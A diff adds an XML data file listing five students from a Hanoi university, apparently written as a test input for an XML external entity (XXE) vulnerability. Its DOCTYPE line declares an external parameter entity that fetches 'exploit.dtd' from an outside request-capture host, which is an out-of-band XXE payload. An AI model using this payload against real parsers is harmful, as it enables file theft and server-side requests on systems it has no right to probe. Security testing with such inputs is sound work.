@@ -1,0 +1,29 @@
+<?xml version='1.0' encoding='UTF-8'?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://hoangnd.free.beeceptor.com/exploit.dtd"> %xxe;]>
+<list>
+    <student>
+        <name>Hoang dep trai</name>
+        <birth>1999</birth>
+        <school>Dai hoc Bach khoa Ha Noi</school>
+    </student>
+    <student>
+        <name>Quang</name>
+        <birth>1999</birth>
+        <school>Dai hoc Bach khoa Ha Noi</school>
+    </student>
+    <student>
+        <name>Trong xxxxxx</name>
+        <birth>1999</birth>
+        <school>Dai hoc Bach khoa Ha Noi</school>
+    </student>
+    <student>
+        <name>Ly</name>
+        <birth>1999</birth>
+        <school>Dai hoc Bach khoa Ha Noi</school>
+    </student>
+    <student>
+        <name>Huy</name>
+        <birth>1999</birth>
+        <school>Dai hoc Bach khoa Ha Noi</school>
+    </student>
+</list>
